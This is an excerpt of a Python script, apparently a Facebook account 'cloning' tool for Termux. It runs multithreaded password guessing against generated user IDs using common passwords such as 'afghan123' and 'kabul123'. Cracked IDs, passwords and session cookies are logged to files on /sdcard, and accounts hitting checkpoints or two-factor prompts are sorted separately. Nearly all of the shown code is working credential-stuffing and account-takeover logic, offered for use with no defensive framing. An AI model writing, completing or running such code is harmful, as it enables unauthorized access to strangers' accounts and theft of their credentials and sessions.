...
\033[1;31m│\033[1;37m☞  \033[1;32mAUTHER     \033[1;31m➟ \033[1;32m KEYANOSH BADAKHSHI         \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mFACEBOOK   \033[1;31m➟ \033[1;32m BAL OCH ZADA󱢏        \033[1;31m
\033[1;31m│\033[1;37m☞  \033[1;32mGITHUB    \033[1;31m ➟ \033[1;32m BADAKSHI                 \033[1;31m 
...
def file_crack():
    ...
    linex()
    opt_method = input(f'CHOOSE SERVER {mubariz2} : ')
    os.system('clear')
    print(logo)
        ...
        for pas in passlist:
            ...
            if 'c_user' in cookies:
                ...
                if cid in ok:
                    ...
                    os.system("play-audio mubariz_OK.mp3")
                    print('\r\033[1;92m[mubariz-OK] '+cid+' | '+pas+'\033[0;97m')
                    ok.append(cid)
                    open('/sdcard/mubariz_OK.txt', 'a').write(cid+' | '+pas+'\n')
                    break
            elif 'checkpoint' in cookies:
                coki=";".join([key+"="+value for key,value in xyz.cookies.get_dict().items()])
                cid = coki[141:156]
                if cid in tf:
                    ...
                    if 'Enter login code to continue' in str(d.group(1)):
                        ...
                        tf.append(cid)
                        open('/sdcard/mubariz_2F.txt', 'a').write(cid+' | '+pas+'\n')
                        break
                    else:
                        if cid in cp:
                            pass
...
def pass3():
    ...
    with ThreadPool(max_workers=30) as manshera:    
        ...
        for love in user:
            uid = code+love
            pwx = [love,'khankhan','afghan123','400500','kabul123','Afghanistan',]
            manshera.submit(freeq,uid,pwx,tl)
    print(f'\n[~]{WHITE}===================================================')
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{WHITE}===================================================')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r{GREEN}[BALOCH-OK]  '+uid+' | '+ps+ '  \n \033[1;32mCookie = \033[1;34m'+coki+  ' \n ')
                cek_apk(session,coki)
                open('/sdcard/baloch-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    open('/sdcard/mubariz-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r{RED}[BALOCH-CP] '+uid+' | '+ps+' ')
                    open('/sdcard/baloch-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[BALOCH💎] [%s] \33[1;97m[OK:%s{noori2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
